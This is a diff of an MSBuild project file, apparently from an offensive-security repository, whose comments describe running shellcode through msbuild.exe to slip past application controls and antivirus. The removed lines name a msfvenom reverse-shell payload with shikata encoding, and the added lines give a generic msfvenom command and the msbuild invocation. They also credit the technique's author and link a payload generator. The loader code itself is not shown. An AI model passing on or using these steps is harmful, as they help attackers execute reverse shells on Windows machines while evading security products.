@@ -1,14 +1,14 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+	
 	  <!-- Original author: The excellent Casey Smith, Twitter: @subTee -->
 	  <!-- https://gist.github.com/caseysmithrc/dfb671a8fbe3fa3305cb1ca06c46a010 -->
 	
   <!-- This executes shellcode via msbuild.exe (be careful of A.V products) -->
-  <!-- generate payload using msfvenom using -f ps1 or -f powershell to obtain valid shellcode -->
-  <!-- In this example: msfvenom -a x86 -p windows/shell_reverse_tcp + shikata -->
-  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe Shell.csproj -->
-  <!-- Save the file and execute it using the command above. -->
+  <!-- To execute your own shellcode, you first need to generate one using MSFVENOM: -->
+  <!-- msfvenom -p <payload to use>  -e <encoder (optional)>  -f ps1 (could also be done with csharp or powershell) -->
+  <!--  Save the file and execute it: C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe Shell.csproj -->
 	
-  <!-- Payload generation tool available here: https://github.com/Mr-Un1k0d3r/PowerLessShell -->
+  <!-- Payload generation tool: https://github.com/Mr-Un1k0d3r/PowerLessShell -->
 	
   <Target Name="Hello">
     <ClassExample />
